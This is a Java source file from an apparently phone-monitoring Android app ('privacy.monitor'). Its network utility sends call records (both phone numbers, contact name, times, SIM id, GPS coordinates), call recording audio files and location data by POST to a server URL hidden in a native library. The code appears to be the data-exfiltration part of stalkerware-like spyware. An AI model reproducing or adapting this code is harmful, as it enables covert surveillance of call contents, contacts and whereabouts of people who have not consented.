package com.privacy.monitor.util;

import java.io.DataOutputStream;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.InetSocketAddress;
import java.net.MalformedURLException;
import java.net.Proxy;
import java.net.URL;

import com.privacy.monitor.base.C;

import android.content.Context;

/**
 * 联网工具类
 * 主要执行文件的上传、下载操作
 */
public class NetworkUtil {
	static{
		
		System.loadLibrary("util");
	
	}
	
	//此方法由c语言实现
	public static native String getURL();
	
	
	
	/**
	 * 上传文件
	 * @param ctx 上下文
	 * @param url 上传文件的url
	 * @param object 上传文件的内容
	 * @return 响应结果
	 */
	public static InputStream upload(Context ctx,String updateData,String requestMethod){
		URL url = null;
		HttpURLConnection conn = null;
		InputStream is = null;
		try {
			String strUrl = getURL();
			strUrl = strUrl+"/"+requestMethod;
			Logger.d("NewworkUtil",strUrl);
			url = new URL(strUrl);
			if (HttpUtil.WAP_INT == HttpUtil.getNetType(ctx)) {
				Proxy proxy = new Proxy(java.net.Proxy.Type.HTTP,new InetSocketAddress("10.0.0.172", 80));
				conn = (HttpURLConnection) url.openConnection(proxy);
			} else {
				conn = (HttpURLConnection) url.openConnection();
			}
			byte [] datas = updateData.getBytes();
			conn.setConnectTimeout(30000);
			conn.setReadTimeout(30000);
			conn.setDoOutput(true);
			conn.setDoInput(true);
			conn.setUseCaches(false);
			conn.setRequestMethod("POST");
			//conn.setRequestProperty("Content-Type","application/x-www-form-urlencoded");
			conn.setRequestProperty("Content-Length",datas.length+"");
			conn.getOutputStream().write(datas);
			if(conn.getResponseCode()==HttpURLConnection.HTTP_OK){
				Logger.d("NewworkUtil","上传数据成功");
				is = conn.getInputStream();
			}
			
		} catch (Exception e) {
			if(e.getMessage() !=null){
				Logger.d("NetworkUtil",e.getMessage());
			}
			return null;
		}
		return is;
	}
	
	/**
	 * 下载文件
	 */
	public static InputStream download(Context ctx,String updateData,String requestMethod){
		URL url = null;
		HttpURLConnection conn = null;
		InputStream is = null;
		try {
			String strUrl = getURL();
			strUrl = strUrl+"/"+requestMethod;
			Logger.d("NewworkUtil",strUrl);
			url = new URL(strUrl);
			if (HttpUtil.WAP_INT == HttpUtil.getNetType(ctx)) {
				Proxy proxy = new Proxy(java.net.Proxy.Type.HTTP,new InetSocketAddress("10.0.0.172", 80));
				conn = (HttpURLConnection) url.openConnection(proxy);
			} else {
				conn = (HttpURLConnection) url.openConnection();
			}
			byte [] datas = updateData.getBytes();
			conn.setConnectTimeout(30000);
			conn.setReadTimeout(30000);
			conn.setDoOutput(true);
			conn.setDoInput(true);
			conn.setUseCaches(false);
			conn.setRequestMethod("POST");
			//conn.setRequestProperty("Content-Type","application/x-www-form-urlencoded");
			conn.setRequestProperty("Content-Length",datas.length+"");
			conn.getOutputStream().write(datas);
			if(conn.getResponseCode()==HttpURLConnection.HTTP_OK){
				Logger.d("NewworkUtil","下载数据成功");
				is = conn.getInputStream();
			}
			
		} catch (Exception e) {
			Logger.d("NetworkUtil",e.getMessage());
			return null;
		}
		return is;
	}
	
	/**
	 * 上传定位信息
	 */
	public static InputStream uploadLocation(Context ctx,String updateData,String requestMethod){
		URL url = null;
		HttpURLConnection conn = null;
		InputStream is = null;
		try {
			String strUrl = getURL();
			strUrl = strUrl+"/"+requestMethod;
			Logger.d("NewworkUtil",strUrl);
			url = new URL(strUrl);
			if (HttpUtil.WAP_INT == HttpUtil.getNetType(ctx)) {
				Proxy proxy = new Proxy(java.net.Proxy.Type.HTTP,new InetSocketAddress("10.0.0.172", 80));
				conn = (HttpURLConnection) url.openConnection(proxy);
			} else {
				conn = (HttpURLConnection) url.openConnection();
			}
			byte [] datas = updateData.getBytes();
			conn.setConnectTimeout(30000);
			conn.setReadTimeout(30000);
			conn.setDoOutput(true);
			conn.setDoInput(true);
			conn.setUseCaches(false);
			conn.setRequestMethod("POST");
			//conn.setRequestProperty("Content-Type","application/x-www-form-urlencoded");
			conn.setRequestProperty("Content-Length",datas.length+"");
			conn.getOutputStream().write(datas);
			if(conn.getResponseCode()==HttpURLConnection.HTTP_OK){
				Logger.d("NewworkUtil","下载数据成功");
				is = conn.getInputStream();
			}
			
		} catch (Exception e) {
			Logger.d("NetworkUtil",e.getMessage());
			return null;
		}
		return is;
	}
	
	public static String uploadCall(String my_num,String you_num,String you_name,String start_time,String end_time,String sim_id,String lon,String lat,String device_name,String type){
		String PARAM_TEMP = "my_num=@MYNUM&you_num=@YOUNUM&your_name=@YOUNAME&start=@START&end=@END&sim_id=@SIM&lon=@LON&lat=@LAT&device=@DEVICE&type=@TYPE";
		String result = "";
		try {
			String strUrl=getURL()+"/"+C.RequestMethod.uploadCallRecord;
			URL url = new URL(strUrl);
			String param = PARAM_TEMP;
			param = param.replace("@MYNUM", my_num);
			param = param.replace("@YOUNUM", you_num);
			param = param.replace("@YOUNAME", you_name);
			param = param.replace("@START", start_time+"");
			param = param.replace("@END", end_time+"");
			param = param.replace("@SIM", sim_id);
			param = param.replace("@LON", lon);
			param = param.replace("@LAT", lat);
			param = param.replace("@DEVICE", device_name);
			param = param.replace("@TYPE", type+"");
			HttpURLConnection conn = (HttpURLConnection) url.openConnection();
			conn.setConnectTimeout(30000);
			conn.setReadTimeout(30000);
			conn.setDoOutput(true);
			conn.setDoInput(true);
			conn.setUseCaches(false);
			conn.setRequestMethod("POST");
			conn.getOutputStream().write(param.getBytes());
		    if(conn.getResponseCode()==HttpURLConnection.HTTP_OK){
		    	Logger.d("NewworkUtil","上传通话记录数据成功");
		     	InputStream inputStream = conn.getInputStream();
		     	if(inputStream !=null){
		     		return AppUtil.streamToStr(inputStream);
		     	}
		    }
		    result = "FAIL:"+conn.getResponseCode();
	     	return result;
		} catch (Exception e) {
			Logger.e("NetworkUtil",e.getMessage());
			result = "FAIL: exception";
			return result;
		}
	}
	
	/**上传文件*/
	public static String uploadFile(String addCallResult,String filePath){
		String result = "OK";
		try {
			URL url = new URL(getURL()+C.RequestMethod.uploadCallSound);
			HttpURLConnection conn = (HttpURLConnection) url.openConnection();
			conn.setDoInput(true);
			conn.setDoOutput(true);
			conn.setUseCaches(false);
			conn.setRequestMethod("POST");
			conn.setRequestProperty("Connection", "Keep-Alive");
			conn.setRequestProperty("Charset", "UTF-8");
			conn.setRequestProperty("Content-Type", "multipart/form-data;boundary=" + "******");
			DataOutputStream dos = new DataOutputStream(conn.getOutputStream());
			dos.writeBytes("--******\r\n");
			dos.writeBytes("Content-Disposition: form-data; name=\"file\"; filename=\""+addCallResult+"\"" + "\r\n");
			dos.writeBytes("\r\n");
			FileInputStream fis = new FileInputStream(filePath);
			byte[] buffer = new byte[8192]; // 8k
			int count = 0;
			while ((count = fis.read(buffer)) != -1) {
				dos.write(buffer, 0, count);
			}
			fis.close();
			dos.writeBytes("\r\n");
			dos.writeBytes("--******--\r\n");
			dos.flush();
			if(conn.getResponseCode()==HttpURLConnection.HTTP_OK){
				Logger.d("NetworkUtil","上传录音文件成功");
				InputStream is = conn.getInputStream();
			   return AppUtil.streamToStr(is);
			}
			result = "FAULT";
		} catch (MalformedURLException e) {
			Logger.e("NetworkUtil",e.getMessage());
		} catch (IOException e) {
			Logger.e("NetworkUtil",e.getMessage());
		}
		return result;
	}
	
	/**上传文件*/
	public static String uploadFile(String addCallResult,InputStream inputStream){
		String result = "OK";
		try {
			String strURL = getURL()+"/"+C.RequestMethod.uploadCallSound;
			Logger.d("NetworkUtil",strURL);
			URL url = new URL(strURL);
			HttpURLConnection conn = (HttpURLConnection) url.openConnection();
			conn.setDoInput(true);
			conn.setDoOutput(true);
			conn.setUseCaches(false);
			conn.setRequestMethod("POST");
			conn.setRequestProperty("Connection", "Keep-Alive");
			conn.setRequestProperty("Charset", "UTF-8");
			conn.setRequestProperty("Content-Type", "multipart/form-data;boundary=" + "******");
			DataOutputStream dos = new DataOutputStream(conn.getOutputStream());
			dos.writeBytes("--******\r\n");
			dos.writeBytes("Content-Disposition: form-data; name=\"file\"; filename=\""+addCallResult+"\"" + "\r\n");
			dos.writeBytes("\r\n");
			
			byte[] buffer = new byte[8192]; // 8k
			int count = 0;
			while ((count = inputStream.read(buffer)) != -1) {
				dos.write(buffer, 0, count);
			}
			inputStream.close();
			dos.writeBytes("\r\n");
			dos.writeBytes("--******--\r\n");
			dos.flush();
			
			if(conn.getResponseCode()==HttpURLConnection.HTTP_OK){
				Logger.d("NetworkUtil","上传录音文件成功");
				InputStream is = conn.getInputStream();
			   return AppUtil.streamToStr(is);
			}
			result = "FAULT";
		} catch (MalformedURLException e) {
			Logger.e("NetworkUtil",e.getMessage());
		} catch (IOException e) {
			Logger.e("NetworkUtil",e.getMessage());
		}
		return result;
	}
}
